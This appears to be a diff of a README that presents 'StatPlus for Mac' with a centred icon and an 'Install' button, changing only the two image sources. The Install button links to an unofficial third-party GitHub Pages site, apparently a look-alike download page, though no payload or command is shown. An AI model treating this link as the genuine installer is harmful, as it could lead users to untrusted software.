@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/b1/c4/d7/b1c4d7e7-7a3e-9c3e-2b5a-2e3b8a8d4b5a/AppIcon-0-0-85-220-0-0-4-0-2x.png/512x512bb.png" width="100" alt="StatPlus icon"/>
+  <img src="https://img.informer.com/icons/png/128/8256/8256294.png" width="100" alt="StatPlus icon"/>
 </p>
 
 <h1 align="center">StatPlus for Mac</h1>
@@ -15,7 +15,7 @@
 
 <p align="center">
   <a href="https://gnida-programs.github.io/.github/statplus">
-    <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/>
+    <img src="https://www.analystsoft.com/img/en-mst.screen1.png" alt="Install" width="160"/>
   </a>
 </p>
 
